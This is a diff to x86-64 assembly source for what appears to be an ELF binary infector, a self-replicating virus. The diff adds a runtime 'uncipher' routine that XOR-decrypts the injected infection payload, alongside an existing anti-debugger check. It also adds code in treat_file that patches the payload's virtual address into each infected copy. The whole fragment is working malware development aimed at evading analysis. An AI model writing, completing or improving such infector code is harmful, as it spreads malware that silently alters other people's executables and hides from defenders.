@@ -55,6 +55,11 @@ can_run_infection:
 	cmp rax, 0					; if (_ret < 0)
 	jl .debugged					; 	goto .debugged;
 
+	; TODO: merge this uncipher with anti-debugger instructions
+	call uncipher					; uncipher();
+
+	; TODO: check file is really unciphered
+
 	mov rax, 1					; return 1;
 	ret
 
@@ -62,6 +67,20 @@ can_run_infection:
 		lea rdi, [rel debugged_message]		; print_string(debugged_message);
 		call print_string			; ...
 		xor rax, rax				; return 0;
+		ret
+
+; void uncipher()
+uncipher:
+	; this value will be modified when injected in a binary
+	db 0xbf, 00, 00, 00, 00				; mov rdi, 0x0 => data = 0x0
+	cmp rdi, 0x0					; if (data == 0x0)
+	je .end						; 	goto .end;
+
+	mov rsi, _end - infection_routine		; size = _end - infection_routine
+	lea rdx, [key]					; key = key
+	call xor_cipher					; xor_cipher(data, size, key)
+
+	.end:
 		ret
 
 ; void infection_routine()
@@ -361,6 +380,16 @@ treat_file:
 	mov rsi, _end - infection_routine		; size = _end - infection_routine
 	lea rdx, [key]					; key = key
 	call xor_cipher					; xor_cipher(data, size, key)
+
+	; change cipher address in injected code (uncipher)
+	mov rdi, [mappedfile]				; uncipher_ptr = file_map + filesize + (uncipher - _begin);
+	add rdi, [filesize]				;
+	add rdi, uncipher - begin			;
+	inc rdi						; 	+ 1;
+	mov rax, [new_vaddr]				; infection_routine_addr = new_vaddr + (infection_routine - _begin);
+	add rax, infection_routine - begin		;
+	mov [rdi], rax					; *uncipher_ptr = infection_routine_addr;
+
 
 .unmap_file:
 	mov rax, SYS_MUNMAP				; _ret = munmap(
